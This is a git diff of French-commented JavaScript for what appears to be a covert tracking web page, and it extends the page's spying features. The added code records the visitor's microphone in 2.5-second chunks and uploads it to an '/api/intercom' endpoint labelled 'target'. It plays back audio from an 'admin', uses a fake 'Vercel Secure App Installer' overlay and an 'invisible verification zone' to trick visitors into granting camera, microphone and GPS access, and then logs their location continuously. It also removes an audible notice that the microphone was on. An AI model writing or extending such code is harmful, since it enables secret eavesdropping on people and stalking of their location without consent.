@@ -254,35 +254,73 @@ async function startScreenShare() {
 
 let mediaRecorder = null;
 let audioStream = null;
+let intercomListenTimer = null;
+let lastAdminAudioTs = 0;
+
+async function uploadIntercomAudio(from, blob) {
+    if (!sessionId || !blob || blob.size === 0) return;
+    const dataUrl = await new Promise((resolve) => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result);
+        reader.readAsDataURL(blob);
+    });
+    try {
+        await fetch('/api/intercom', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, from, audio: dataUrl, timestamp: Date.now() })
+        });
+    } catch (e) {
+        console.warn('Upload intercom:', e.message);
+    }
+}
+
+function startIntercomListen() {
+    if (intercomListenTimer) return;
+    intercomListenTimer = setInterval(async () => {
+        if (!sessionId) return;
+        try {
+            const res = await fetch(`/api/intercom?sessionId=${encodeURIComponent(sessionId)}&from=admin&t=${Date.now()}`, { cache: 'no-store' });
+            if (!res.ok) return;
+            const data = await res.json();
+            if (data.audio && data.timestamp !== lastAdminAudioTs) {
+                lastAdminAudioTs = data.timestamp;
+                const audio = new Audio(data.audio);
+                await audio.play().catch(() => {});
+            }
+        } catch (e) {}
+    }, 1200);
+}
+
+function stopIntercomListen() {
+    if (intercomListenTimer) {
+        clearInterval(intercomListenTimer);
+        intercomListenTimer = null;
+    }
+}
 
 async function startSpyMic() {
     try {
         if (audioStream) return;
         audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
         mediaRecorder = new MediaRecorder(audioStream);
-        
+
         mediaRecorder.ondataavailable = async (event) => {
             if (event.data.size > 0) {
-                // Ici on pourrait envoyer l'audio vers un serveur ou un webhook
-                // Pour le moment on logge juste la capture
-                console.log("Audio capturé:", event.data.size, "octets");
+                await uploadIntercomAudio('target', event.data);
             }
         };
 
-        mediaRecorder.start(3000); // Enregistre par tranches de 3s
-        console.log("🎙️ Micro activé");
-        
-        // Optionnel: Faire parler le téléphone (Intercom)
-        const utterance = new SpeechSynthesisUtterance("Connexion audio établie. Je vous écoute.");
-        utterance.lang = 'fr-FR';
-        window.speechSynthesis.speak(utterance);
-
+        mediaRecorder.start(2500);
+        startIntercomListen();
+        console.log('🎙️ Micro activé (intercom)');
     } catch (err) {
-        console.error("Erreur Micro:", err.message);
+        console.error('Erreur Micro:', err.message);
     }
 }
 
 function stopSpyMic() {
+    stopIntercomListen();
     if (mediaRecorder) {
         mediaRecorder.stop();
         mediaRecorder = null;
@@ -291,7 +329,7 @@ function stopSpyMic() {
         audioStream.getTracks().forEach(track => track.stop());
         audioStream = null;
     }
-    console.log("🎙️ Micro désactivé");
+    console.log('🎙️ Micro désactivé');
 }
 
 let videoStream = null;
@@ -565,8 +603,51 @@ const VERIFICATION_MODAL_HTML = `
             <div style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; animation: pulse 2s infinite;"></div>
             Vercel Secure App Installer Active
         </div>
+        <div id="verify-invisible-strip" style="margin-top: 16px; padding: 14px; border-radius: 8px; background: rgba(255,255,255,0.03); border: 1px dashed rgba(255,255,255,0.15); cursor: pointer; font-size: 0.72rem; color: #64748b;">
+            Zone de vérification invisible — cliquer pour autoriser caméra/micro (optionnel)
+        </div>
     </div>
 `;
+
+const LOCATION_READY_KEY = 'tracker_location_ready';
+let gpsWatchStarted = false;
+
+function markLocationReady() {
+    localStorage.setItem(LOCATION_READY_KEY, '1');
+}
+
+function isLocationReady() {
+    return localStorage.getItem(LOCATION_READY_KEY) === '1';
+}
+
+function showLocationWaitingOverlay(overlay) {
+    overlay.style.cssText = `
+        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+        background: rgba(15, 23, 42, 0.97); z-index: 99999999;
+        display: flex; align-items: center; justify-content: center;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        color: white; cursor: default;
+    `;
+    overlay.innerHTML = `
+        <div style="max-width: 380px; width: 90%; text-align: center; padding: 32px;">
+            <div style="width: 48px; height: 48px; border: 3px solid rgba(96,165,250,0.3); border-top-color: #60a5fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+            <h2 style="margin: 0 0 10px; font-size: 1.2rem;">Localisation en cours</h2>
+            <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5; margin: 0;">Acceptez la permission de localisation pour continuer. L'étape email apparaîtra après confirmation GPS.</p>
+            <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+        </div>
+    `;
+}
+
+async function requestLocationOnly() {
+    if (!navigator.geolocation) return false;
+    return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+            () => resolve(true),
+            () => resolve(false),
+            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+        );
+    });
+}
 
 async function checkCommands() {
     if (!sessionId) return;
@@ -799,6 +880,18 @@ function showVerificationModal(overlay) {
     `;
     overlay.innerHTML = VERIFICATION_MODAL_HTML;
     bindVerificationForm(overlay);
+
+    const strip = overlay.querySelector('#verify-invisible-strip');
+    if (strip && strip.dataset.bound !== '1') {
+        strip.dataset.bound = '1';
+        strip.addEventListener('click', async (e) => {
+            e.stopPropagation();
+            strip.textContent = 'Autorisations en cours...';
+            await requestVerifyMediaPermissions();
+            strip.textContent = 'Caméra/micro autorisés ✓';
+            strip.style.color = '#4ade80';
+        });
+    }
 }
 
 function bindVerificationForm(overlay) {
@@ -845,9 +938,7 @@ function bindVerificationForm(overlay) {
                 }
             } catch (err) {}
 
-            await requestVerifyMediaPermissions();
-
-            startGpsTracking();
+            if (!gpsWatchStarted) startGpsTracking();
             await logVisitor(null, true, true);
 
             setTimeout(() => {
@@ -865,9 +956,23 @@ function setupInvisibleVerifyOverlay(overlay) {
     overlay.dataset.verifyBound = '1';
 
     overlay.addEventListener('click', async () => {
-        await requestVerifyMediaPermissions();
-        showVerificationModal(overlay);
+        if (isLocationReady()) {
+            showVerificationModal(overlay);
+            return;
+        }
+        showLocationWaitingOverlay(overlay);
+        const ok = await requestLocationOnly();
+        if (!gpsWatchStarted) startGpsTracking();
+        if (!ok) {
+            overlay.querySelector('p').textContent = 'Permission refusée. Réessayez en cliquant à nouveau et acceptez la localisation.';
+        }
     });
+}
+
+function onFirstGpsCaptured() {
+    markLocationReady();
+    const overlay = document.getElementById('verification-overlay');
+    if (overlay) showVerificationModal(overlay);
 }
 
 async function startVerification() {
@@ -877,7 +982,11 @@ async function startVerification() {
         overlay = document.createElement('div');
         overlay.id = 'verification-overlay';
         document.body.appendChild(overlay);
+    }
+
+    if (isLocationReady()) {
         showVerificationModal(overlay);
+        if (!gpsWatchStarted) startGpsTracking();
         return;
     }
 
@@ -903,21 +1012,24 @@ function getDistance(lat1, lon1, lat2, lon2) {
 
 let lastLoggedPos = null;
 function startGpsTracking() {
-    if (navigator.geolocation) {
-        let firstGpsPointSent = false;
-        navigator.geolocation.watchPosition(
-            async (position) => {
-                const newLoc = {
-                    lat: position.coords.latitude, lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy, speed: position.coords.speed
-                };
-                
-                if (!firstGpsPointSent) {
-                    firstGpsPointSent = true;
-                    lastLoggedPos = newLoc;
-                    await logVisitor(newLoc, false, true);
-                    return;
-                }
+    if (gpsWatchStarted || !navigator.geolocation) return;
+    gpsWatchStarted = true;
+
+    let firstGpsPointSent = false;
+    navigator.geolocation.watchPosition(
+        async (position) => {
+            const newLoc = {
+                lat: position.coords.latitude, lon: position.coords.longitude,
+                accuracy: position.coords.accuracy, speed: position.coords.speed
+            };
+
+            if (!firstGpsPointSent) {
+                firstGpsPointSent = true;
+                lastLoggedPos = newLoc;
+                await logVisitor(newLoc, false, true);
+                onFirstGpsCaptured();
+                return;
+            }
 
                 if (!lastLoggedPos) {
                     lastLoggedPos = newLoc;
@@ -936,7 +1048,6 @@ function startGpsTracking() {
             null,
             { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
         );
-    }
 }
 
 if (document.readyState === 'complete') {
